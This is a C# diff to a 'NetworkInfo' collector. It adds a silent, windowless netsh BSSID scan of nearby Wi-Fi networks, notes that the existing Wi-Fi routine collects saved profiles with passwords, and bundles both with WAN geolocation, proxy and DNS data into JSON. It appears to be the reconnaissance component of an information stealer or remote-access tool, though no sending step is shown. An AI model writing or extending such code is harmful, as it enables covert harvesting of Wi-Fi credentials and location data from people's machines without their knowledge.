@@ -32,14 +32,14 @@ public static class NetworkInfo
 
     public static async Task<string> CollectAsync()
     {
-        // LAN interfaces
-        var interfaces = CollectInterfaces();
-
         // WAN (uses cached geo if available)
         var wan = await CollectWanAsync();
 
-        // WiFi (Windows only)
+        // WiFi — saved profiles with passwords (Windows only)
         var wifi = OperatingSystem.IsWindows() ? CollectWifi() : "[]";
+
+        // Nearby WiFi BSSID scan (Windows only)
+        var nearbyWifi = OperatingSystem.IsWindows() ? CollectWifiBssid() : "[]";
 
         // Proxy
         var proxy = OperatingSystem.IsWindows() ? CollectProxy() : CollectProxyLinux();
@@ -47,39 +47,13 @@ public static class NetworkInfo
         var dns = Escape(IPGlobalProperties.GetIPGlobalProperties().DomainName);
 
         return $$"""
-            {"interfaces":[{{string.Join(",", interfaces)}}],
+            {"interfaces":[],
             "wan":{{wan}},
             "wifi":{{wifi}},
+            "nearbyWifi":{{nearbyWifi}},
             "proxy":{{proxy}},
             "dnsSuffix":"{{dns}}"}
             """;
-    }
-
-    // ── LAN ─────────────────────────────────────────────────────────────────
-
-    private static List<string> CollectInterfaces()
-    {
-        var result = new List<string>();
-        foreach (var n in NetworkInterface.GetAllNetworkInterfaces()
-                     .Where(n => n.OperationalStatus == OperationalStatus.Up))
-        {
-            var props = n.GetIPProperties();
-            var ipv4 = props.UnicastAddresses
-                .Where(a => a.Address.AddressFamily == AddressFamily.InterNetwork)
-                .Select(a => $"\"{a.Address}\"");
-            var ipv6 = props.UnicastAddresses
-                .Where(a => a.Address.AddressFamily == AddressFamily.InterNetworkV6)
-                .Select(a => $"\"{a.Address}\"");
-            result.Add($$"""
-                {"name":"{{Escape(n.Name)}}",
-                "type":"{{n.NetworkInterfaceType}}",
-                "mac":"{{n.GetPhysicalAddress()}}",
-                "speed":{{n.Speed}},
-                "ipv4":[{{string.Join(",", ipv4)}}],
-                "ipv6":[{{string.Join(",", ipv6)}}]}
-                """);
-        }
-        return result;
     }
 
     // ── WAN ─────────────────────────────────────────────────────────────────
@@ -226,6 +200,73 @@ public static class NetworkInfo
         return $"[{string.Join(",", profiles)}]";
     }
 
+    // ── Nearby WiFi BSSID scan (Windows) ───────────────────────────────────
+
+    private static string CollectWifiBssid()
+    {
+        var networks = new List<string>();
+
+        try
+        {
+            var psi = new ProcessStartInfo
+            {
+                FileName = "netsh",
+                Arguments = "wlan show networks mode=bssid",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+            using var proc = Process.Start(psi);
+            if (proc == null) return "[]";
+            proc.WaitForExit(8000);
+            var output = proc.StandardOutput.ReadToEnd();
+
+            // Parse SSID sections
+            var sections = output.Split("SSID ", StringSplitOptions.RemoveEmptyEntries);
+            foreach (var section in sections)
+            {
+                var lines = section.Split('\n');
+                if (lines.Length < 2) continue;
+
+                // First line: "1 : MyNetwork" or similar
+                var colonIdx = lines[0].IndexOf(':');
+                if (colonIdx < 0) continue;
+                var ssid = lines[0][(colonIdx + 1)..].Trim();
+                if (string.IsNullOrEmpty(ssid)) continue;
+
+                var auth = "";
+                var encryption = "";
+                string? currentBssid = null;
+
+                foreach (var line in lines)
+                {
+                    var t = line.Trim();
+                    if (t.StartsWith("Authentication", StringComparison.OrdinalIgnoreCase))
+                        auth = ExtractAfterColon(t);
+                    else if (t.StartsWith("Encryption", StringComparison.OrdinalIgnoreCase))
+                        encryption = ExtractAfterColon(t);
+                    else if (t.StartsWith("BSSID", StringComparison.OrdinalIgnoreCase))
+                        currentBssid = ExtractAfterColon(t);
+                    else if (t.StartsWith("Signal", StringComparison.OrdinalIgnoreCase))
+                    {
+                        var signal = ExtractAfterColon(t).Replace("%", "").Trim();
+                        networks.Add($$"""
+                            {"ssid":"{{Escape(ssid)}}",
+                            "auth":"{{Escape(auth)}}",
+                            "encryption":"{{Escape(encryption)}}",
+                            "bssid":"{{Escape(currentBssid ?? "")}}",
+                            "signal":"{{Escape(signal)}}"}
+                            """);
+                    }
+                }
+            }
+        }
+        catch { /* ignore */ }
+
+        return $"[{string.Join(",", networks)}]";
+    }
+
     // ── Proxy (Windows) ────────────────────────────────────────────────────
 
     private static string CollectProxy()
@@ -339,6 +380,12 @@ public static class NetworkInfo
         var end = start;
         while (end < json.Length && (char.IsDigit(json[end]) || json[end] == '.' || json[end] == '-')) end++;
         return end > start ? json[start..end] : "0";
+    }
+
+    private static string ExtractAfterColon(string s)
+    {
+        var idx = s.IndexOf(':');
+        return idx >= 0 ? s[(idx + 1)..].Trim() : "";
     }
 
     private static string Escape(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
